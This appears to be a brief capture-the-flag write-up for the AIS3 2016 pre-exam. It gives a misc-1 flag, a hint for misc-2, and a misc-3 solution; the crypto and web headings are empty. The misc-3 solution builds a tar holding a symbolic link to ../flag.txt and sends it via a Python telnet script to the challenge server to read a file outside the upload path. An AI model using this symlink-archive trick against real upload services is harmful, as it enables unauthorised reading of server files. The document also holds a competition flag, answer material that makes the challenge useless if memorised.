## misc-1

`The key is ais3{2016_^_^_hello_world!}`

## misc-2

Hint: 7Zip


## misc-3

Hint: symbolic link

`ln -s ../flag.txt guess.txt`

`tar cvf guess.tar guess.txt`

`python misc3_sol.py`

misc3_sol 

```
import telnetlib

data = str.encode(list(open('guess.tar'))[0])
client = telnetlib.Telnet('quiz.ais3.org', 9150)
client.write(str.encode(str(len(data))) + '\n' + data)
print(client.read_all())
```

## crypto-1


## crypto-2


## web-1


## web-2


## web-3



